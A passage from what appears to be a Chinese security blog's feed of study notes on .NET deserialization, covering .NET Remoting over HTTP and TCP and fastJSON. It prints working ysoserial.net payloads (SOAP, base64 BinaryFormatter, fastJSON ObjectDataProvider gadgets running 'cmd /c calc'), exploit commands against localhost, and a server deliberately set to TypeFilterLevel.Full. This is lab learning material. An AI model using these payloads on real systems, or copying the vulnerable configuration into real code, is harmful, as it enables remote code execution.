start&quot;</span>);</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>WellKnownObjectMode.Singleton</code>这个东西没啥用  不注意就行了</p><h2 id="RemoteDemoClient-客户端"><a href="#RemoteDemoClient-客户端" class="headerlink" title="RemoteDemoClient(客户端)"></a>RemoteDemoClient(客户端)</h2><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> RemoteDemoObject;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">RemoteDemoClient</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> serverAddress = <span class="string">&quot;http://localhost:9999/RemoteDemoObjectClass.rem&quot;</span>;</span><br><span class="line">            RemoteDemoObjectClass obj1 = (RemoteDemoObjectClass)Activator.GetObject(<span class="keyword">typeof</span>(RemoteDemoObjectClass), serverAddress);</span><br><span class="line"></span><br><span class="line">            Console.WriteLine(<span class="string">&quot;call GetCount() get return value:&#123;0&#125;&quot;</span>,obj1.GetCount());</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读取远程地址  然后获取其对象  然后执行其里面的GetCount函数</p><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p>服务端</p><p><img src="../images/image-20240315101447980.png" alt="image-20240315101447980"></p><p>客户端</p><p><img src="../images/image-20240315101458308.png" alt="image-20240315101458308"></p><h2 id="HttpServerChannel数据包"><a href="#HttpServerChannel数据包" class="headerlink" title="HttpServerChannel数据包"></a>HttpServerChannel数据包</h2><p>先使用bp来修改代理</p><p><img src="../images/image-20240315110035354.png" alt="image-20240315110035354"></p><p>然后修改Client的代码   将原本9999端口改为8080端口</p><p><img src="../images/image-20240315110236767.png" alt="image-20240315110236767"></p><p><img src="../images/image-20240315110317840.png" alt="image-20240315110317840"></p><p>一看就是将数据进行soap序列化然后再进行传输</p><p>跟进代码进行分析</p><p><img src="../images/image-20240315110413176.png" alt="image-20240315110413176"></p><p>跟进HttpServerChannel类</p><p><img src="../images/image-20240315110437774.png" alt="image-20240315110437774"></p><p>跟进SetupChannel函数</p><p><img src="../images/image-20240315110506975.png" alt="image-20240315110506975"></p><p>在判断sinkProvider参数为空的情况下  我们跟进这个CreateDefaultServerProviderChain函数</p><p><img src="../images/image-20240315110559136.png" alt="image-20240315110559136"></p><p><img src="../images/image-20240315110700515.png" alt="image-20240315110700515"></p><p>发现这里使用了一个Provider链，从SdlChannelSinkProvider-&gt;SoapServerFormatterSinkProvider-&gt;BinaryServerFormatterSinkProvider</p><p><strong>而TcpServerChannel中，使用的是BinaryServerFormatterSinkProvider-&gt;SoapServerFormatterSinkProvider</strong></p><p>由此可见http使用soap协议进行序列化，tcp使用binary进行序列化。</p><h3 id="漏洞产生"><a href="#漏洞产生" class="headerlink" title="漏洞产生"></a>漏洞产生</h3><p>我们再抓包的时候  发现了其实将类进行soap序列化之后进行传输的  如果我们修改传输的内容  是不是就可以RCE了？</p><p>yso生成poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ysoserial.exe -f soapformatter -g TextFormattingRunProperties -c calc</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;SOAP-ENV:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:clr=&quot;http://schemas.microsoft.com/soap/encoding/clr/1.0&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;</span><br><span class="line">&lt;SOAP-ENV:Body&gt;</span><br><span class="line">&lt;a1:TextFormattingRunProperties id=&quot;ref-1&quot; xmlns:a1=&quot;http://schemas.microsoft.com/clr/nsassem/Microsoft.VisualStudio.Text.Formatting/Microsoft.PowerShell.Editor%2C%20Version%3D3.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3D31bf3856ad364e35&quot;&gt;</span><br><span class="line">&lt;ForegroundBrush id=&quot;ref-3&quot;&gt;&amp;#60;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;utf-16&amp;#34;?&amp;#62;</span><br><span class="line">&amp;#60;ObjectDataProvider MethodName=&amp;#34;Start&amp;#34; IsInitialLoadEnabled=&amp;#34;False&amp;#34; xmlns=&amp;#34;http://schemas.microsoft.com/winfx/2006/xaml/presentation&amp;#34; xmlns:sd=&amp;#34;clr-namespace:System.Diagnostics;assembly=System&amp;#34; xmlns:x=&amp;#34;http://schemas.microsoft.com/winfx/2006/xaml&amp;#34;&amp;#62;</span><br><span class="line">  &amp;#60;ObjectDataProvider.ObjectInstance&amp;#62;</span><br><span class="line">    &amp;#60;sd:Process&amp;#62;</span><br><span class="line">      &amp;#60;sd:Process.StartInfo&amp;#62;</span><br><span class="line">        &amp;#60;sd:ProcessStartInfo Arguments=&amp;#34;/c calc&amp;#34; StandardErrorEncoding=&amp;#34;&#123;x:Null&#125;&amp;#34; StandardOutputEncoding=&amp;#34;&#123;x:Null&#125;&amp;#34; UserName=&amp;#34;&amp;#34; Password=&amp;#34;&#123;x:Null&#125;&amp;#34; Domain=&amp;#34;&amp;#34; LoadUserProfile=&amp;#34;False&amp;#34; FileName=&amp;#34;cmd&amp;#34; /&amp;#62;</span><br><span class="line">      &amp;#60;/sd:Process.StartInfo&amp;#62;</span><br><span class="line">    &amp;#60;/sd:Process&amp;#62;</span><br><span class="line">  &amp;#60;/ObjectDataProvider.ObjectInstance&amp;#62;</span><br><span class="line">&amp;#60;/ObjectDataProvider&amp;#62;&lt;/ForegroundBrush&gt;</span><br><span class="line">&lt;/a1:TextFormattingRunProperties&gt;</span><br><span class="line">&lt;/SOAP-ENV:Body&gt;</span><br><span class="line">&lt;/SOAP-ENV:Envelope&gt;</span><br></pre></td></tr></table></figure><p>将<code>&lt;/SOAP-ENV:Body&gt;</code>标签去掉的时候  直接放入包中就行了</p><p><img src="../images/image-20240315111248404.png" alt="image-20240315111248404"></p><p>当我们直接修改发包的时候  发现并没有弹出计算器  这里的原因就是客户端不会反序列化我们传入的类  因为不是其指定的类   这里就涉及到了这个<strong>TypeFilterLevel</strong>参数了</p><p>在上文中我们提到SoapServerFormatterSinkProvider和BinaryServerFormatterSinkProvider，这两个类都有一个重要的属性<strong>TypeFilterLevel</strong>，<a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.runtime.serialization.formatters.typefilterlevel?view=net-5.0">根据文档</a>可知其是枚举类型。</p><p><img src="../images/image-20240315111429821.png" alt="image-20240315111429821"></p><p>那么我们将其设置为Full的时候  应该就能反序列化成功了</p><p><strong>修改Server端代码</strong></p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Remoting;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Remoting.Channels;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Remoting.Channels.Http;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters;</span><br><span class="line"><span class="keyword">using</span> RemoteDemoObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">RemoteDemoServer</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            SoapServerFormatterSinkProvider soapServerFormatterSinkProvider = <span class="keyword">new</span> SoapServerFormatterSinkProvider()</span><br><span class="line">            &#123;</span><br><span class="line">                TypeFilterLevel = TypeFilterLevel.Full</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            IDictionary hashtables = <span class="keyword">new</span> Hashtable();</span><br><span class="line">            hashtables[<span class="string">&quot;port&quot;</span>] = <span class="number">9999</span>;</span><br><span class="line"></span><br><span class="line">            HttpServerChannel httpServerChannel = <span class="keyword">new</span> HttpServerChannel(hashtables,soapServerFormatterSinkProvider);</span><br><span class="line">            ChannelServices.RegisterChannel(httpServerChannel, <span class="literal">false</span>);</span><br><span class="line">            RemotingConfiguration.RegisterWellKnownServiceType(<span class="keyword">typeof</span>(RemoteDemoObjectClass), <span class="string">&quot;RemoteDemoObjectClass.rem&quot;</span>, WellKnownObjectMode.Singleton);</span><br><span class="line"></span><br><span class="line">            Console.WriteLine(<span class="string">&quot;server has been start&quot;</span>);</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240315111622503.png" alt="image-20240315111622503"></p><p>在HttpServerChannel中采用两个参数的重载，传入SoapServerFormatterSinkProvider，赋值<code>TypeFilterLevel = TypeFilterLevel.Full</code>。再次发包<br><img src="../images/image-20240315111716559.png" alt="image-20240315111716559"></p><p>这次就成功的弹出了计算器</p><h2 id="TcpServerChannel数据包"><a href="#TcpServerChannel数据包" class="headerlink" title="TcpServerChannel数据包"></a>TcpServerChannel数据包</h2><p>tcpServerChannel是以二进制的形式将数据进行传输  我们使用burp修改不了  这里只能使用工具来进行替代</p><p>这里修改一下客户端和服务端  </p><p>客户端</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> RemoteDemoObject;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">RemoteDemoClient</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> serverAddress = <span class="string">&quot;tcp://localhost:9999/RemoteDemoObjectClass.rem&quot;</span>;</span><br><span class="line">            RemoteDemoObjectClass obj1 = (RemoteDemoObjectClass)Activator.GetObject(<span class="keyword">typeof</span>(RemoteDemoObjectClass), serverAddress);</span><br><span class="line"></span><br><span class="line">            Console.WriteLine(<span class="string">&quot;get string:\t&#123;0&#125;&quot;</span>,obj1.GetCount());</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务端</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Remoting;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Remoting.Channels;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Remoting.Channels.Tcp;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters;</span><br><span class="line"><span class="keyword">using</span> RemoteDemoObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">RemoteDemoServer</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            BinaryServerFormatterSinkProvider binary = <span class="keyword">new</span> BinaryServerFormatterSinkProvider()</span><br><span class="line">            &#123;</span><br><span class="line">                TypeFilterLevel = TypeFilterLevel.Full</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            IDictionary hashtables = <span class="keyword">new</span> Hashtable();</span><br><span class="line">            hashtables[<span class="string">&quot;port&quot;</span>] = <span class="number">9999</span>;</span><br><span class="line"></span><br><span class="line">            TcpServerChannel httpServerChannel = <span class="keyword">new</span> TcpServerChannel(hashtables,binary);</span><br><span class="line">            ChannelServices.RegisterChannel(httpServerChannel, <span class="literal">false</span>);</span><br><span class="line">            RemotingConfiguration.RegisterWellKnownServiceType(<span class="keyword">typeof</span>(RemoteDemoObjectClass), <span class="string">&quot;RemoteDemoObjectClass.rem&quot;</span>, WellKnownObjectMode.Singleton);</span><br><span class="line"></span><br><span class="line">            Console.WriteLine(<span class="string">&quot;server has been start&quot;</span>);</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里用wireshark来进行抓包   burp抓不了二进制流  跟踪TCP流</p><p><img src="../images/image-20240315142616014.png" alt="image-20240315142616014"></p><p>发现数据流以<code>2e 4e 45 54</code> <code>.NET</code>开头进行二进制传输远程调用方法、类型和命名空间。我们可以伪造tcp数据流来发送恶意二进制数据流进行反序列化RCE。</p><h3 id="漏洞产生-1"><a href="#漏洞产生-1" class="headerlink" title="漏洞产生"></a>漏洞产生</h3><p>Github上有一个现成的工具<a href="https://github.com/tyranid/ExploitRemotingService">ExploitRemotingService</a>，通过它的raw参数我们可以发送原始binary数据。先使用ysoserial.net生成base64的payload。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ysoserial.exe -f binaryformatter -g TextFormattingRunProperties -c calc -o base64</span><br><span class="line"></span><br><span class="line">AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAswU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIGNhbGMiIFN0YW5kYXJkRXJyb3JFbmNvZGluZz0ie3g6TnVsbH0iIFN0YW5kYXJkT3V0cHV0RW5jb2Rpbmc9Int4Ok51bGx9IiBVc2VyTmFtZT0iIiBQYXNzd29yZD0ie3g6TnVsbH0iIERvbWFpbj0iIiBMb2FkVXNlclByb2ZpbGU9IkZhbHNlIiBGaWxlTmFtZT0iY21kIiAvPg0KICAgICAgPC9zZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICA8L3NkOlByb2Nlc3M+DQogIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KPC9PYmplY3REYXRhUHJvdmlkZXI+Cw==</span><br></pre></td></tr></table></figure><p>然后使用ExploitRemotingService发包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ExploitRemotingService.exe tcp://localhost:9999/RemoteDemoObjectClass.rem raw base64</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240315144115413.png" alt="image-20240315144115413"></p><p>跟踪TCP流我们也发现了</p><p><img src="../images/image-20240315144159449.png" alt="image-20240315144159449"></p><p>这些就是我们base64传输的内容</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里偷一张Y4er师傅的图</p><p><img src="../images/image-20240315144342739.png" alt="image-20240315144342739"></p><p>关注TcpChannel、HttpChannel及其子类所创建实例的TypeFilterLevel字段是否为Full。其实为Low的时候ExploitRemotingService也可以利用，但是要设置<code>ConfigurationManager.AppSettings.Set(&quot;microsoft:Remoting:AllowTransparentProxyMessage&quot;, false;</code>这个全局非默认配置，少见，仅作了解。</p><p>关注rem后缀的uri，可能就是.net remoting。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://github.com/Y4er/dotnet-deserialization/blob/main/.NET%20Remoting.md&quot;&gt;https://github.com/Y4er/dotnet-deserialization/blob</summary>
      
    
    
    
    
    <category term="dotnet" scheme="https://ke1nys.github.io/tags/dotnet/"/>
    
  </entry>
  
  <entry>
    <title>Dotnet-Deserialization-12</title>
    <link href="https://ke1nys.github.io/posts/24e97acc.html"/>
    <id>https://ke1nys.github.io/posts/24e97acc.html</id>
    <published>2024-03-14T06:00:06.000Z</published>
    <updated>2024-04-18T12:57:04.531Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/Y4er/dotnet-deserialization/blob/main/Fastjson.md">https://github.com/Y4er/dotnet-deserialization/blob/main/Fastjson.md</a></p><h2 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h2><p>fastjson2.2.4版本</p><p>和java的差不多</p><p>本文讲解fastjson.net的反序列化漏洞</p><p>demo</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> fastJSON;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Fastjson.NetSerializer</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Person</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Name &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Person person = <span class="keyword">new</span> Person();</span><br><span class="line">            person.Name = <span class="string">&quot;jack&quot;</span>;</span><br><span class="line">            <span class="built_in">string</span> json = JSON.ToJSON(person);</span><br><span class="line">            Console.WriteLine(json);</span><br><span class="line">            Person p = JSON.ToObject&lt;Person&gt;(json);</span><br><span class="line">            Console.WriteLine(p.Name);</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240314140751216.png" alt="image-20240314140751216"></p><p>这里使用ToObject函数来将Json来转成对象的</p><h2 id="Gadget"><a href="#Gadget" class="headerlink" title="Gadget"></a>Gadget</h2><p>其实还是用的ObjectDataProvider这个类来进行操作</p><p>yso生成的poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;$types&quot;:&#123;</span><br><span class="line">        &quot;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = 31bf3856ad364e35&quot;:&quot;1&quot;,</span><br><span class="line">        &quot;System.Diagnostics.Process, System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089&quot;:&quot;2&quot;,</span><br><span class="line">        &quot;System.Diagnostics.ProcessStartInfo, System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089&quot;:&quot;3&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;$type&quot;:&quot;1&quot;,</span><br><span class="line">    &quot;ObjectInstance&quot;:&#123;</span><br><span class="line">        &quot;$type&quot;:&quot;2&quot;,</span><br><span class="line">        &quot;StartInfo&quot;:&#123;</span><br><span class="line">            &quot;$type&quot;:&quot;3&quot;,</span><br><span class="line">            &quot;FileName&quot;:&quot;cmd&quot;,&quot;Arguments&quot;:&quot;/c calc&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;MethodName&quot;:&quot;Start&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>demo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">using fastJSON;</span><br><span class="line">using System;</span><br><span class="line">using System.IO;</span><br><span class="line"></span><br><span class="line">namespace Fastjson</span><br><span class="line">&#123;</span><br><span class="line">    class Person</span><br><span class="line">    &#123;</span><br><span class="line">        public string Name &#123; get; set; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            Person person = new Person();</span><br><span class="line">            person.Name = &quot;jack&quot;;</span><br><span class="line">            string json =  JSON.ToJSON(person);</span><br><span class="line">            Console.WriteLine(json);</span><br><span class="line">            Person p = JSON.ToObject&lt;Person&gt;(File.ReadAllText(&quot;1.json&quot;));</span><br><span class="line">            Console.WriteLine(p.Name);</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240314141242996.png" alt="image-20240314141242996"></p><p>重点就是在Json可不可控  Fastjson的版本有没有洞之类的</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://github.com/Y4er/dotnet-deserialization/blob/main/Fastjson.md&quot;&gt;https://github.com/Y4er/dotnet-deserialization/blob/main/F</summary>
      
    
    
    
    
    <category term="dotnet" scheme="https://ke1nys.github.io/tags/dotnet/"/>
    
  </entry>
  
  <entry>
    <title>Dotnet-Deserialization-11</title>
    <link href="https://ke1nys.github.io/posts/bde02b76.html"/>
    <id>https://ke1nys.github.io/posts/bde02b76.html</id>
    <published>2024-03-14T02:08:30.000Z</published>
    <updated>2024-04-18T12:57:04.529Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/Y4er/dotnet-deserialization/blob/main/Json.Net.md">https://github.com/Y4er/dotnet-deserialization/blob/main/Json.Net.md</a></p><h2 id="Json-Net"><a href="#Json-Net" class="headerlink" title="Json.Net"></a>Json.Net</h2><p><a href="https://www.newtonsoft.com/json/help/html/SerializingJSON.htm">官方文档</a>给出了最简单的两个json示例，分别是JsonConvert、JsonSerializer。这里先看下JsonConvert</p><p>demo</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> Newtonsoft.Json;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Json.NetSerializer</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Person</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Name &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Person person = <span class="keyword">new</span> Person();</span><br><span class="line">            person.Name = <span class="string">&quot;jack&quot;</span>;</span><br><span class="line">            <span class="built_in">string</span> v = 